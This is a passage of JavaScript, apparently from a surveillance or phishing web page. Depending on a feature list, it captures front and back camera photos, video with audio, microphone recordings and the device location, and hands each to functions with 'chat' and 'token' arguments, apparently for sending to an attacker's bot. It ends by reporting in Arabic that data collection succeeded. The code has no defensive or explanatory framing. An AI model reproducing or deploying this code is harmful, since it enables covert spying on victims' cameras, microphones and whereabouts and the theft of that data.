                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    await captureAndSend(stream, chat, token, 'front');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log('فشلت صورة أمامية'); }
            }

            if (featureList.includes('camBack')) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    await captureAndSend(stream, chat, token, 'back');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log('فشلت صورة خلفية'); }
            }

            if (featureList.includes('videoFront')) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
                        audio: true });
                    await recordAndSend(stream, chat, token, 'front');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log('فشل فيديو أمامي'); }
            }

            if (featureList.includes('videoBack')) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
                        audio: true });
                    await recordAndSend(stream, chat, token, 'back');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log('فشل فيديو خلفي'); }
            }

            if (featureList.includes('audio')) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    await recordAudioAndSend(stream, chat, token);
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) { console.log('فشل تسجيل صوتي'); }
            }

            if (featureList.includes('location')) {
                await sendLocation(chat, token);
            }

            // إرسال تأكيد انتهاء الجمع
            await sendConfirmation(chat, token, "✅ تم جمع البيانات بنجاح");
        }
